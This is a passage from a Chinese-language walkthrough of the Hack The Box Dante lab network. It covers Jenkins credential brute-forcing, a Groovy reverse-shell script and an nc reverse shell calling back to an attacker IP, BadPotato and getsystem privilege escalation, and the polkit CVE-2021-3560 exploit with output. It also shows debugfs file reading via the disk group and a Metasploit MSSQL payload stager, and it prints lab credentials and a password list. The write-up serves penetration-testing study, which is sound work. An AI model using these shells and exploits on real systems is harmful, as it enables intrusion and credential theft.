但执行之后无法成功，直接通过 `whoami /priv` 显示 `Access is denied`。

执行 msf 载荷，获取到一个 meterpreter 之后再进入 powershell 就可以成功提权了。

```bash
PS C:\temp> Invoke-BadPotato -Command "whoami"
Invoke-BadPotato -Command "whoami"
[*]

    ____            ______        __        __      
   / __ )____ _____/ / __ \____  / /_____ _/ /_____ 
  / __  / __ `/ __  / /_/ / __ \/ __/ __ `/ __/ __ \
 / /_/ / /_/ / /_/ / ____/ /_/ / /_/ /_/ / /_/ /_/ /
/_____/\__,_/\__,_/_/    \____/\__/\__,_/\__/\____/ 

Github:https://github.com/BeichenDream/BadPotato/       By:BeichenDream
            
[*] PipeName : \\.\pipe\66836c1007e24080b640ea5c4d421270\pipe\spoolss
[*] ConnectPipeName : \\DANTE-WS03/pipe/66836c1007e24080b640ea5c4d421270
[*] CreateNamedPipeW Success! IntPtr:2744
[*] RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:2124303388560
[*] ConnectNamePipe Success!
[*] CurrentUserName : blake
[*] CurrentConnectPipeUserName : SYSTEM
[*] ImpersonateNamedPipeClient Success!
[*] OpenThreadToken Success! IntPtr:1660
[*] DuplicateTokenEx Success! IntPtr:1652
[*] SetThreadToken Success!
[*] CurrentThreadUserName : NT AUTHORITY\SYSTEM
[*] CreateOutReadPipe Success! out_read:1648 out_write:1640
[*] CreateErrReadPipe Success! err_read:1664 err_write:1672
[*] CreateProcessWithTokenW Success! ProcessPid:5076
nt authority\system


[*] Bye!

```
但不知道什么原因，执行 runme.bat 或者 nc 反弹 shell 时会卡住。
```powershell
Invoke-BadPotato -Command "c:\temp\nc.exe -e powershell.exe 10.10.14.5 9001"
Invoke-BadPotato -Command "c:\temp\runme.bat"
```
直接使用 msf 内置的 getsystem 获取到 system 权限。
```bash
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
```


## Linux: 172.16.1.19
172.16.1.19	80      apache 服务，可显示目录，但没有内容
172.16.1.19	8080    Jekins 服务
172.16.1.19	8443    可能是扫描错误，无法访问
172.16.1.19	8888    可能是扫描错误，无法访问

部分端口无法访问，可能是使用 fscan 扫描出现问题，可以使用 nmap 重新扫一遍。
```bash
p -q nmap 172.16.1.102 -sT -Pn -T5
```

### Jekins 后台 getshell
goby 扫描 Jenkins 版本为 2.240，存在 WEB-INF/web.xml 读取漏洞，但复现后发现并未存在，应该是误报。


2.240 版本没有公开漏洞，尝试爆破用户名密码。msf 中有集成 jenkins 登陆爆破脚本：
- auxiliary/scanner/http/jenkins_login

利用脚本的 USERPASS_FILE 可以设置用户名密码文件，用户名和密码之间用空格切分。
```bash
asmith Princess1
smoggat Summer2019
tmodle P45678!
ccraven Password1
kploty Teacher65
jbercov 4567Holiday1
whaguey acb123
dcamtan WorldOfWarcraft67
tspadly RopeBlackfieldForwardslash
ematlis JuneJuly1TY
fglacdon FinalFantasy7
tmentrso 65RedBalloons
dharding WestminsterOrange5
smillar MarksAndSparks91
bjohnston Bullingdon1
iahmed Sheffield23
plongbottom PowerfixSaturdayClub777
jcarrot Tanenbaum0001
lgesley SuperStrongCantForget123456789
julian manchesterunited
ben Welcometomyblog
balthazar TheJoker12345!
mrb3n S3kur1ty2020!
```

但此前在 172.16.2.5 (DANTE-DC02) 中获取到了一个 jenkins.bat，其中就包含了一个 jenkins 的凭证，该凭证可以正常登陆到后台。
- Admin_129834765/SamsungOctober102030

登陆成功后可以看到一个 Project FLAG_HERE，其中包含了 flag

jenkins 中的 script console 可以进一步通过执行 Groovy 获取系统 shell。访问 url：/script
```java
String host="10.10.14.5";int port=9898;String cmd="bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
pwncat-cs：
```bash
listen -m linux 9898
```
### 提权至 ian: pspy
pspy 可以查看到一些隐藏的进程，其中可能就包含了敏感的凭证信息，这部分功能是 linPEAS 不具备的。
```bash
2024/01/01 16:35:01 CMD: UID=0     PID=142235 | /usr/sbin/CRON -f 
2024/01/01 16:35:01 CMD: UID=0     PID=142237 | /bin/bash mysql -u ian -p VPN123ZXC 
2024/01/01 16:35:01 CMD: UID=0     PID=142236 | /bin/sh -c /bin/bash mysql -u ian -p VPN123ZXC 
```
pspy 找到了一个由 ian 用户运行的 mysql 连接，密码为 VPN123ZXC


### 提权至 root: polkit:CVE-2021-3560
```bash
▀█▀ █▀█ ▄▀█ █ ▀█▀ █▀█ █▀█                                                                                                               
░█░ █▀▄ █▀█ █ ░█░ █▄█ █▀▄ v0.0.14                                                                                                                   
https://github.com/liamg/traitor                                                                                                                    

[+] Assessing machine state...                                                                                                                      
[+] Checking for opportunities...
[+][polkit:CVE-2021-3560] Polkit version is vulnerable!
[+][polkit:CVE-2021-3560] System is vulnerable! Run again with '--exploit polkit:CVE-2021-3560' to exploit it.
(remote) jenkins@DANTE-NIX07:/tmp/.j$ ./.t --exploit polkit:CVE-2021-3560


▀█▀ █▀█ ▄▀█ █ ▀█▀ █▀█ █▀█                                                                                                               
░█░ █▀▄ █▀█ █ ░█░ █▄█ █▀▄ v0.0.14                                                                                                                   
https://github.com/liamg/traitor                                                                                                                    

[+] Assessing machine state...                                                                                                                      
[+] Checking for opportunities...
[+][polkit:CVE-2021-3560] Polkit version is vulnerable!
[+][polkit:CVE-2021-3560] Opportunity found, trying to exploit it...
[+][polkit:CVE-2021-3560] Sampling timing of user creation command...
[+][polkit:CVE-2021-3560] Average time for user creation to fail authentication is 5.879881ms
[+][polkit:CVE-2021-3560] Attempting to create user 'traitor795' by forcing UID=0...
[+][polkit:CVE-2021-3560] User 'traitor795' was created with UID (1002)!
[+][polkit:CVE-2021-3560] Sampling timing of password set command...
[+][polkit:CVE-2021-3560] Average time for password set to fail authentication is 5.447048ms
[+][polkit:CVE-2021-3560] Attempting to set user password...
[+][polkit:CVE-2021-3560] Finished attempting to set password.
[+][polkit:CVE-2021-3560] Setting up tty...
[+][polkit:CVE-2021-3560] Attempting authentication as new user...
[+][polkit:CVE-2021-3560] Authenticated as traitor795 (1002)!
[+][polkit:CVE-2021-3560] Attempting escalation to root...
[+][polkit:CVE-2021-3560] Authenticated as root!
[+][polkit:CVE-2021-3560] Writing payload...

root@DANTE-NIX07:~# ls
```
### 提权: disk 组用户利用
ian 用户属于 disk 组，"disk"是一个特殊用途的系统组，用于授予用户对磁盘访问的权限。这意味着属于"disk"组的用户可能具有特定的磁盘访问权限，例如对硬盘驱动器进行读写操作。
```bash
uid=1001(ian) gid=1001(ian) groups=1001(ian),6(disk)
```
切换到 ian 后查看 /proc/self/mounts 来获取磁盘信息：`cat /proc/self/mounts|grep 'sda'`
```bash
cat /proc/self/mounts|grep 'sda'
/dev/sda5 / ext4 rw,relatime,errors=remount-ro 0 0
/dev/sda1 /boot/efi vfat rw,relatime,fmask=0077,dmask=0077,codepage=437,iocharset=iso8859-1,shortname=mixed,errors=remount-ro 0 0
```
可以看到挂载的 /dev/sda5 就是根目录，并且 ian 用户具备 rw 权限，说明可以通过 debugfs 直接读取任意的文件。
```bash
ian@DANTE-NIX07:/tmp$ debugfs /dev/sda5
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cat /root/flag.txt
DANTE{g0tta_<3_ins3cur3_GROupz!}
debugfs:  
```
## Windows: 172.16.1.5
开放端口：
```
5985,135,445,111,2049,139,1433,47001,21
```
1. 1433 MSSQL
2. 21 ftp
### FTP 允许匿名登陆
使用 cme 可以批量扫描内网中的 ftp 是否允许 anonymous 登陆。
```bash
p -q crackmapexec ftp 172.16.1.0/24 -u anonymous -p ''
```
结果如下：
```bash
FTP         172.16.1.5      21     172.16.1.5       [*] Banner: Dante Staff Drop Box
FTP         172.16.1.100    21     172.16.1.100     [*] Banner: (vsFTPd 3.0.3)
FTP         172.16.1.101    21     172.16.1.101     [*] Banner:-FileZilla Server 0.9.60 beta
220 DANTE-FTP
FTP         172.16.1.12     21     172.16.1.12      [*] Banner: ProFTPD Server (ProFTPD) [::ffff:172.16.1.12]
FTP         172.16.1.5      21     172.16.1.5       [+] anonymous:
FTP         172.16.1.100    21     172.16.1.100     [+] anonymous:
FTP         172.16.1.101    21     172.16.1.101     [-] anonymous: (Response:530 Login or password incorrect!)
FTP         172.16.1.12     21     172.16.1.12      [-] anonymous: (Response:530 Login incorrect.)
```
可以发现 172.16.1.5 也同样允许 ftp 匿名登陆。

登陆后可以得到一个 flag.txt

### NFS 服务探测
172.16.1.5 的 2049 端口运行了 nfs 服务，nfs 服务与 SMB 有着相同的用途，但没有身份验证和授权机制。

hacktricks 中详细记录了对 nfs 服务的渗透思路：[2049 - Pentesting NFS Service - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)

但 nfs 服务上没有挂载任何东西。
```bash
p -q showmount -e 172.168.1.5
```

### MSSQL: xp_cmdshell
此前在 172.16.2.6 中获取到一个 SQL 凭证：
- Sophie/TerrorInflictPurpleDirt996655

msf 中集成了 MSSQL 登陆的脚本：
```bash
use auxiliary/scanner/mssql/mssql_login
set USERNAME Sophie
set PASSWORD TerrorInflictPurpleDirt996655
set RHOST 172.16.1.5
run

[*] 172.16.1.5:1433       - 172.16.1.5:1433 - MSSQL - Starting authentication scanner.
[!] 172.16.1.5:1433       - No active DB -- Credential data will not be saved!
[+] 172.16.1.5:1433       - 172.16.1.5:1433 - Login Successful: WORKSTATION\Sophie:TerrorInflictPurpleDirt996655
[*] 172.16.1.5:1433       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

连接 MSSQL 可以使用 impacket 中的 mssqlclient.py 
```bash
p -q mssqlclient.py Sophie:TerrorInflictPurpleDirt996655@172.16.1.5
```
但会出现报错，应该是本地环境的问题。
```bash
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[-] [('SSL routines', '', 'no protocols available')]
```
切换到 python 3.9 + Impacket v0.11.0 可以正常连接并执行 xp_cmdshell。
```bash
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DANTE-SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DANTE-SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sophie  dbo@master)> EXEC xp_cmdshell "net user";

```


### MSSQL: xp_cmdshell (MSF)
msf 也集成了对 MSSQL xp_cmdshell 的利用，该 exp 会尝试远程下载 payload 再运行。
```bash
use exploit/windows/mssql/mssql_payload
set LHOST 10.10.14.5
set RHOST 172.16.1.5
set username Sophie
set PassWORD TerrorInflictPurpleDirt996655
run

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] 172.16.1.5:1433 - Command Stager progress -   1.47% done (1499/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -   2.93% done (2998/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -   4.40% done (4497/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -   5.86% done (5996/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -   7.33% done (7495/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -   8.80% done (8994/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  10.26% done (10493/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  11.73% done (11992/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  13.19% done (13491/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  14.66% done (14990/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  16.13% done (16489/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  17.59% done (17988/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  19.06% done (19487/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  20.53% done (20986/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  21.99% done (22485/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  23.46% done (23984/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  24.92% done (25483/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  26.39% done (26982/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  27.86% done (28481/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  29.32% done (29980/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  30.79% done (31479/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  32.25% done (32978/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  33.72% done (34477/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  35.19% done (35976/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  36.65% done (37475/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  38.12% done (38974/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  39.58% done (40473/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  41.05% done (41972/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  42.52% done (43471/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  43.98% done (44970/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  45.45% done (46469/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  46.91% done (47968/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  48.38% done (49467/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  49.85% done (50966/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  51.31% done (52465/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  52.78% done (53964/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  54.24% done (55463/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  55.71% done (56962/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  57.18% done (58461/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  58.64% done (59960/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  60.11% done (61459/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  61.58% done (62958/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  63.04% done (64457/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  64.51% done (65956/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  65.97% done (67455/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  67.44% done (68954/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  68.91% done (70453/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  70.37% done (71952/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  71.84% done (73451/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  73.30% done (74950/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  74.77% done (76449/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  76.24% done (77948/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  77.70% done (79447/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  79.17% done (80946/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  80.63% done (82445/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  82.10% done (83944/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  83.57% done (85443/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  85.03% done (86942/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  86.50% done (88441/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  87.96% done (89940/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  89.43% done (91439/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  90.90% done (92938/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  92.36% done (94437/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  93.83% done (95936/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  95.29% done (97435/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  96.76% done (98934/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  98.19% done (100400/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress -  99.59% done (101827/102246 bytes)
[*] 172.16.1.5:1433 - Command Stager progress - 100.00% done (102246/102246 bytes)
[*] Sending stage (175686 bytes) to 10.10.110.3
[*] Meterpreter session 16 opened (10.10.14.5:4444 -> 10.10.110.3:19751) at 2024-01-01 22:48:21 -0500
```

获得 shell 后在 c:\Users 目录中可以发现 flag.txt
### 提权: PrintSpooler
MSSQL 用户一般拥有 SeImpersonatePrivilege 权限，可以使用 Potato 家族提权，MSF 中可以直接使用 getsystem 命令。
```bash
meterpreter > getsystem 
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
```


## 参考
- [Dante by Tamarisk](https://mega.nz/folder/J7VSgZiD#WzxgZ6mpK8YXotGDFQRWww)
- [HTB Dante Walkthrough – rainb0w's blog](https://blog.snert.cn/index.php/2023/05/16/htb-dante-walkthrough/)
- [Wordpress - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)